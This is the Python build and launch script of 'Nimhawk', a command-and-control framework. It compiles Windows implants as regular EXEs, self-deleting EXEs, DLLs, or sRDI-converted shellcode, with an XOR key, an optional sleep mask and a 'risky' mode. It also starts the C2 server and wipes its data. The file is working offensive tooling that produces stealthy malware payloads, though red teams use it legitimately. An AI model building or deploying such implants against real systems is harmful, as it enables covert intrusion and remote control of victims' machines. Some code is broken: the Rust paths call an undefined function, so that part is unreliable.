#!/usr/bin/python3
# pylint: disable=import-outside-toplevel

"""
Nimhawk - First-stage implant for adversarial operations
a powerful, modular, lightweight and efficient command & control framework.
"""

import argparse
import os
import random
import sys
import time
import toml
from implant.srdi.ShellcodeRDI import ConvertToShellcode, HashFunctionName
from subprocess import run


def print_banner():
    print(
        r"""
                               /T /I
                              / |/ | .-~/
                          T\ Y  I  |/  /  _
         /T               | \I  |  I  Y.-~/
        I l   /I       T\ |  |  l  |  T  /
     T\ |  \ Y l  /T   | \I  l   \ `  l Y
 __  | \l   \l  \I l __l  l   \   `  _. |
 \ ~-l  `\   `\  \  \\ ~\  \   `. .-~   |
  \   ~-. "-.  `  \  ^._ ^. "-.  /  \   |
.--~-._  ~-  `  _  ~-_.-"-." ._ /._ ." ./
 >--.  ~-.   ._  ~>-"    "\\   7   7   ]
^.___~"--._    ~-{  .-~ .  `\ Y . /    |
 <__ ~"-.  ~       /_/   \   \I  Y   : |
   ^-.__           ~(_/   \   >._:   | l______
       ^--.,___.-~"  /_/   !  `-.~"--l_ /     ~"-.
              (_/ .  ~(   /'     "~"--,Y   -=b-. _)
               (_/ .  \  :           / l      c"~o \
                \ /    `.    .     .^   \_.-~"~--.  )
                 (_/ .   `  /     /       !       )/
                  / / _.   '.   .':      /        '
                  ~(_/ .   /    _  `  .-<_
                    /_/ . ' .-~" `.  / \  \          ,z=.
                    ~( /   '  :   | K   "-.~-.______//
                      "-,.    l   I/ \_    __{--->._(==.
                       //(     \  <    ~"~"     //
                      /' /\     \  \     ,v=.  ((
                    .^. / /\     "  }__ //===-  `
                   / / ' '  "-.,__ {---(==-
                 .^ '       :  T  ~"   ll       
                / .  .  . : | :!        \\
               (_/  /   | | j-"          ~^
                 ~-<_(_.^-~"
    
"With words, man surpasses animals, but with silence he surpasses himself." 

 _   _ _           _   _                _    
| \ | (_)_ __ ___ | | | | __ ___      _| | __
|  \| | | '_ ` _ \| |_| |/ _` \ \ /\ / / |/ /
| |\  | | | | | | |  _  | (_| |\ V  V /|   < 
|_| \_|_|_| |_| |_|_| |_|\__,_| \_/\_/ |_|\_\                                  
                                                                                                  
         A powerful, modular, lightweight and efficient command & control framework
         By Alejandro Parodi (hdbreaker / @SecSignal).

         Credits to @chvancooten, Nimhawk is heavily based in his NimPlant project. 
         Really thanks to Cas van Cooten for sharing this amazing project with the community.
         Hope my work can be useful for you and other security professionals.
    """
    )


def get_xor_key(force_new=False):
    """Get the XOR key for pre-crypto operations."""
    if os.path.isfile(".xorkey") and not force_new:
        file = open(".xorkey", "r", encoding="utf-8")
        xor_key = int(file.read())
    else:
        print("Generating unique XOR key for pre-crypto operations...")
        print(
            "NOTE: Make sure the '.xorkey' file matches if you run the server elsewhere!"
        )
        xor_key = random.randint(0, 2147483647)
        with open(".xorkey", "w", encoding="utf-8") as file:
            file.write(str(xor_key))

    return xor_key


def shellcode_from_dll(lang, xor_key, config, workspace_uuid=None, debug=False):
    """Convert the DLL implant to shellcode using sRDI."""
    if lang == "nim":
        dll_path = "implant/release/implant.dll"
        if debug:
            compile_function = compile_nim_debug
        else:
            compile_function = compile_nim

    if not os.path.isfile(dll_path):
        compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)
    else:
        # Compile a new DLL implant if no recent version exists
        file_mod_time = os.stat(dll_path).st_mtime
        last_time = (time.time() - file_mod_time) / 60

        if not last_time < 5:
            compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)

    # Convert DLL to PIC using sRDI
    with open(dll_path, "rb") as f:
        shellcode = ConvertToShellcode(f.read(), HashFunctionName("runDLL"), flags=0x4)

    with open(os.path.splitext(dll_path)[0] + ".bin", "wb") as f:
        f.write(shellcode)


def compile_implant(implant_type, binary_type, xor_key, workspace_uuid=None):
    """Compile the implant based on the specified type and binary type."""
    # Parse config for certain compile-time tasks
    config_path = os.path.abspath(
        os.path.join(os.path.dirname(sys.argv[0]), "config.toml")
    )
    config = toml.load(config_path)

    match implant_type:
        case "nim":
            message = "Implant"
            compile_function = compile_nim
        case "nim-debug":
            message = "Implant with debugging enabled"
            compile_function = compile_nim_debug

    if binary_type == "exe":
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config, workspace_uuid=workspace_uuid)
    elif binary_type == "exe-selfdelete":
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config, workspace_uuid=workspace_uuid)
    elif binary_type == "dll":
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)
    elif binary_type == "raw" or binary_type == "bin":
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config, workspace_uuid=workspace_uuid)
    else:
        # Compile all
        print(f"Compiling .exe for {message}")
        compile_function("exe", xor_key, config, workspace_uuid=workspace_uuid)
        print(f"Compiling self-deleting .exe for {message}")
        compile_function("exe-selfdelete", xor_key, config, workspace_uuid=workspace_uuid)
        print(f"Compiling .dll for {message}")
        compile_function("dll", xor_key, config, workspace_uuid=workspace_uuid)
        print(f"Compiling .bin for {message}")
        compile_function("raw", xor_key, config, workspace_uuid=workspace_uuid)


def compile_nim_debug(binary_type, xor_key, config, workspace_uuid=None, debug=True):
    """Compile the Nim implant with debugging enabled."""
    if binary_type == "exe-selfdelete":
        print(
            "ERROR: Cannot compile self-deleting Implant with debugging enabled!\n"
            "Please test with the regular executable first, "
            "then compile the self-deleting version.\n"
            "Skipping this build..."
        )
        return

    compile_nim(binary_type, xor_key, config, workspace_uuid=workspace_uuid, debug=True)


def compile_nim(binary_type, xor_key, config, workspace_uuid=None, debug=False):
    """Compile the Nim implant."""
    # Construct compilation command
    if binary_type == "exe" or binary_type == "exe-selfdelete":
        compile_command = (
            "nim c -f --os:windows --cpu:amd64 -d:release -d:strip -d:noRes "
            + f"-d:INITIAL_XOR_KEY={xor_key} "
        )
        
        # Add workspace_uuid if provided
        if workspace_uuid:
            compile_command += f"-d:workspace_uuid=\"{workspace_uuid}\" "
            
        compile_command += "--hints:off --warnings:off"

        if debug:
            compile_command = compile_command + " -d:verbose"
        else:
            compile_command = compile_command + " --app:gui"

        if os.name != "nt":
            compile_command = compile_command + " -d=mingw"

        if binary_type == "exe":
            compile_command = compile_command + " -o:implant/release/implant.exe"

        if binary_type == "exe-selfdelete":
            compile_command = (
                compile_command + " -o:implant/release/implant-selfdelete.exe -d:selfdelete"
            )

        # Sleep mask enabled only if defined in config.toml
        sleep_mask_enabled = config["implant"]["sleepMask"]
        if sleep_mask_enabled:
            compile_command = compile_command + " -d:sleepmask"

        # Allow risky commands only if defined in config.toml
        risky_mode = config["implant"]["riskyMode"]
        if risky_mode:
            compile_command = compile_command + " -d:risky"

        compile_command = compile_command + " implant/NimHawk.nim"
        
    elif binary_type == "dll":
        # Updated command according to specification
        compile_command = (
            f"nim c --os:windows --cpu:amd64 -d:release -d:mingw -d:exportDll "
            f"-d:xor_key={xor_key} "  # Uses the xor_key from the .xorkey file
        )
        
        # Add workspace_uuid if provided
        if workspace_uuid:
            compile_command += f"-d:workspace_uuid=\"{workspace_uuid}\" "
            
        compile_command += (
            f"--passL:\"-static\" "
            f"--app:lib "
            f"-o:implant/release/implant.dll implant/NimHawk.nim"
        )
        
        # Add additional flags while preserving the correct format
        if debug:
            compile_command = compile_command.replace("nim c ", "nim c -d:verbose ")
        
        # Sleep mask and risky mode
        sleep_mask_enabled = config["implant"]["sleepMask"]
        if sleep_mask_enabled:
            compile_command = compile_command.replace("-d:mingw ", "-d:mingw -d:sleepmask ")
            
        risky_mode = config["implant"]["riskyMode"]
        if risky_mode:
            compile_command = compile_command.replace("-d:mingw ", "-d:mingw -d:risky ")
            
    elif binary_type == "raw":
        shellcode_from_dll("nim", xor_key, config, workspace_uuid=workspace_uuid, debug=debug)
        return
        
    # Print command for debugging
    if debug:
        print(f"DEBUG: Executing compile command: {compile_command}")
        
    os.system(compile_command)


def compile_rust_debug(binary_type, xor_key, config):
    """Compile the Rust implant with debugging enabled."""
    compile_rust(binary_type, xor_key, config, debug=True)


def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser()
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Compile command
    compile_parser = subparsers.add_parser("compile", help="Compile the implant.")
    compile_parser.add_argument(
        "binary_type",
        choices=["exe", "exe-selfdelete", "dll", "raw", "bin", "all"],
        help="Type of binary to compile.",
    )
    compile_parser.add_argument(
        "implant_type",
        choices=["nim", "nim-debug", "rust", "rust-debug"],
        nargs="?",
        default="nim",
        help="Type of implant to compile.",
    )
    compile_parser.add_argument(
        "-r", "--rotatekey", action="store_true", help="Rotate the XOR key."
    )
    compile_parser.add_argument(
        "-w", "--workspace", type=str, dest="workspace_uuid", help="Workspace UUID for the implant."
    )

    # Server command
    server_parser = subparsers.add_parser("server", help="Start the server.")
    server_parser.add_argument(
        "server_name", nargs="?", default="", help="Name of the server."
    )

    # Cleanup command
    subparsers.add_parser("cleanup", help="Clean up server files.")

    return parser.parse_args()


def main():
    """Main function for nimhawk.py."""
    args = parse_args()
    print_banner()

    if not os.path.isfile("config.toml"):
        print(
            "ERROR: No configuration file found. Please create 'config.toml'",
            "based on the example configuration before use.",
        )
        exit(1)

    if args.command == "compile":
        # Only create a new key if explicitly requested with --rotatekey
        xor_key = get_xor_key(force_new=args.rotatekey)
        if args.rotatekey:
            print(f"Rotated XOR key to: {xor_key}")
        else:
            print(f"Using existing XOR key: {xor_key}")
            
        # Get workspace_uuid if provided, otherwise use empty string
        workspace_uuid = args.workspace_uuid if args.workspace_uuid is not None else ""
        if workspace_uuid:
            print(f"Using workspace UUID: {workspace_uuid}")
            
        compile_implant(args.implant_type, args.binary_type, xor_key, workspace_uuid)

        out_path = (
            "implant/release" 
        )
        print(f"Done compiling! You can find compiled binaries in '{out_path}'.")

    elif args.command == "server":
        # Ensure XOR key exists when starting the server
        xor_key = get_xor_key()
        print(f"Using XOR key: {xor_key} for server encryption")
        
        # Wait for 5 seconds before starting the server to avoid race condition
        time.sleep(5)

        name = "Nimhawk"
        os.chdir("server")
        run(["python3", "main.py", name])

    elif args.command == "cleanup":
        from shutil import rmtree

        # Confirm if the user is sure they want to delete all files
        print(
            "WARNING: This will delete ALL Implant server data:",
            "Uploads/downloads, logs, and the database!",
            "Are you sure you want to continue? (y/n):",
            end=" ",
        )

        if input().lower() != "y":
            print("Aborting...")
            exit(0)

        print("Cleaning up...")

        try:
            # Clean up files
            for filepath in ["server/nimhawk.db"]:
                if os.path.exists(filepath) and os.path.isfile(filepath):
                    os.remove(filepath)

            # Clean up directories
            for dirpath in [
                "server/downloads",
                "server/logs",
                "server/uploads",
            ]:
                if os.path.exists(dirpath) and os.path.isdir(dirpath):
                    rmtree(dirpath)

            print("Cleaned up Nimhawk server files!")
        except OSError:
            print(
                "ERROR: Could not clean up all Nimhawk server files.",
                "Do you have the right privileges?",
            )


if __name__ == "__main__":
    main()
